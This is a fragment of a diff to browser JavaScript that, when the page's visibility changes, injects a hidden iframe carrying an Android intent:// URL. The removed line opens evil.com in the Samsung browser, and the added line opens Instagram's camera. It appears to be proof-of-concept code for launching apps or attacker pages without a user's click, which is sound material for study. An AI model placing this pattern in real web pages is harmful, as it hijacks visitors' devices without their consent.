@@ -4,7 +4,7 @@ document.addEventListener("visibilitychange", function() {
         setTimeout(() => {
             let iframe = document.createElement('iframe');
             iframe.style.display = 'none';
-            iframe.src = 'intent://evil.com/#Intent;scheme=https;package=com.sec.android.app.sbrowser;end;';
+            iframe.src = 'intent://camera/#Intent;package=com.instagram.android;scheme=instagram;end;';
             document.body.appendChild(iframe);
             
             setTimeout(() => {
